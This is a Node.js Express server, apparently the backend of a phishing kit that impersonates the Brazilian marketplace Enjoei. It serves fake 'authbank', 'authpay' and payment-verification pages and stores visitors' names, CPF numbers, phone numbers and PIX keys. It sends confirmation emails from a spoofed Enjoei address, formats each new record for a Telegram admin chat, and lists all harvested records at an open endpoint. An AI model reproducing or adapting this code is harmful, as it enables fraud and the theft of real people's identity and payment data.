require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;


// Página inicial
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'inicial', 'index.html'));
});

// Rotas HTML
app.get('/acesso', (req, res) => {
  res.sendFile(path.join(__dirname, 'acesso', 'index.html'));
});

app.get('/authbank', (req, res) => {
  res.sendFile(path.join(__dirname, 'authbank', 'index.html'));
});

app.get('/authpay', (req, res) => {
  res.sendFile(path.join(__dirname, 'authpay', 'index.html'));
});

app.get('/confirm', (req, res) => {
  res.sendFile(path.join(__dirname, 'confirm', 'index.html'));
});

app.get('/pay', (req, res) => {
  res.sendFile(path.join(__dirname, 'pay', 'index.html'));
});

app.get('/payvery', (req, res) => {
  res.sendFile(path.join(__dirname, 'payvery', 'index.html'));
});

app.get('/very', (req, res) => {
  res.sendFile(path.join(__dirname, 'very', 'index.html'));
});

app.get('/VeryPagement', (req, res) => {
  res.sendFile(path.join(__dirname, 'VeryPagement', 'pagamento.html'));
});

// Arquivos estáticos
app.use('/acesso', express.static(path.join(__dirname, 'acesso')));
app.use('/authbank', express.static(path.join(__dirname, 'authbank')));
app.use('/authpay', express.static(path.join(__dirname, 'authpay')));
app.use('/confirm', express.static(path.join(__dirname, 'confirm')));
app.use('/pay', express.static(path.join(__dirname, 'pay')));
app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
app.use('/very', express.static(path.join(__dirname, 'very')));
app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement')));
app.use('/img', express.static(path.join(__dirname, 'img'))); 

// Telegram Bot
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMINS = process.env.ADMINS?.split(',').map(id => parseInt(id.trim())) || [];
let CHAT_ID = null;
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

bot.on('message', (msg) => {
  if (ADMINS.length === 0 || ADMINS.includes(msg.chat.id)) {
    CHAT_ID = msg.chat.id;
    console.log(`Chat ID autorizado atualizado: ${CHAT_ID}`);
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Banco de dados
const db = new sqlite3.Database('clientes.db', (err) => {
  if (err) console.error('Database error:', err);
  else console.log('Database connected');
});

db.run(`
  CREATE TABLE IF NOT EXISTS clientes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    nome TEXT NOT NULL,
    cpf TEXT NOT NULL UNIQUE,
    telefone TEXT NOT NULL,
    pix_key_type TEXT NOT NULL,
    pix_key TEXT NOT NULL,
    status TEXT DEFAULT 'pendente',
    data_cadastro TEXT DEFAULT CURRENT_TIMESTAMP
  )
`);

// Configuração de e-mail
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// Enviar e-mail
async function sendConfirmationEmail(cliente, emailDestino) {
  if (!emailDestino) {
    console.warn('Email não fornecido, pulando envio.');
    return;
  }

  const mailOptions = {
    from: 'Enjoei <noreply@enjoei.com>',
    to: emailDestino,
    subject: 'Cadastro realizado com sucesso!',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; line-height: 1.6; color: #333; background-color: #f9f9f9; border-radius: 10px;">
        <div style="text-align: center; padding: 20px; background-color: #800080; border-radius: 10px 10px 0 0;">
          <h1 style="color: #fff; margin: 0; font-size: 28px;">Cadastro realizado! 🎉</h1>
        </div>
        <div style="padding: 20px; background-color: #fff; border-radius: 0 0 10px 10px;">
          <p style="font-size: 16px; margin: 0 0 15px;">Olá ${cliente.nome},</p>
          <p style="font-size: 16px; margin: 0 0 15px;">Seus dados foram registrados com sucesso em nosso sistema.</p>
          <p style="font-size: 16px; margin: 0 0 15px;"><strong>Chave PIX:</strong> ${cliente.pix_key}</p>
          <p style="font-size: 16px; margin: 0 0 15px;">Em breve você receberá seu pagamento.</p>
        </div>
      </div>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('E-mail enviado para:', emailDestino);
  } catch (error) {
    console.error('Erro ao enviar e-mail:', error);
  }
}



// Rota para cadastro
app.post('/api/clients', (req, res) => {
  const { nome, cpf, telefone, pix_key_type, pix_key, email } = req.body;

  if (!nome || !cpf || !telefone || !pix_key_type || !pix_key) {
    return res.status(400).json({ error: 'Todos os campos são obrigatórios' });
  }

  const stmt = `
    INSERT INTO clientes (nome, cpf, telefone, pix_key_type, pix_key) 
    VALUES (?, ?, ?, ?, ?)
  `;

  db.run(stmt, [nome, cpf, telefone, pix_key_type, pix_key], function (err) {
    if (err) {
      console.error('Erro ao salvar no banco:', err.message);
      if (err.message.includes('UNIQUE constraint failed: clientes.cpf')) {
        return res.status(400).json({ error: 'CPF já cadastrado' });
      }
      return res.status(500).json({ error: 'Erro ao salvar cliente' });
    }

    const cliente = {
      id: this.lastID,
      nome,
      cpf,
      telefone,
      pix_key_type,
      pix_key,
      status: 'pendente',
      data_cadastro: new Date().toISOString()
    };

    // Enviar e-mail de confirmação
    sendConfirmationEmail(cliente, email);

    // Enviar para o Telegram (certificando-se de que o CHAT_ID está correto)
    if (CHAT_ID) {
      const msg = `✨ *Novo Cadastro Recebido!* ✨

👤 *Nome:* \`${nome}\`
🆔 *CPF:* \`${cpf}\`
📞 *Telefone:* \`${telefone}\`

💳 *Chave PIX*
• *Tipo:* \`${pix_key_type}\`
• *Chave:* \`${pix_key}\`

📅 *Data/Hora:* _${new Date().toLocaleString()}_`;

    } else {
      console.warn('CHAT_ID não foi encontrado. Verifique se um administrador interagiu com o bot.');
    }

    // Redirecionar para a página de pagamento
    res.redirect('/VeryPagement/pagamento.html');
  });
});

// Listar clientes
app.get('/api/clients', (req, res) => {
  db.all('SELECT * FROM clientes ORDER BY data_cadastro DESC', [], (err, rows) => {
    if (err) {
      console.error('Erro ao buscar clientes:', err);
      return res.status(500).json({ error: 'Erro ao buscar clientes' });
    }
    res.json(rows);
  });
});

app.get('/VeryPagement/pagamento.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'VeryPagement', 'pagamento.html'));
});

// Fallback para frontend
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'authbank', 'index.html'));
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});

// Fechar conexões
process.on('SIGINT', () => {
  db.close();
  if (bot) bot.stopPolling();
  process.exit();
});
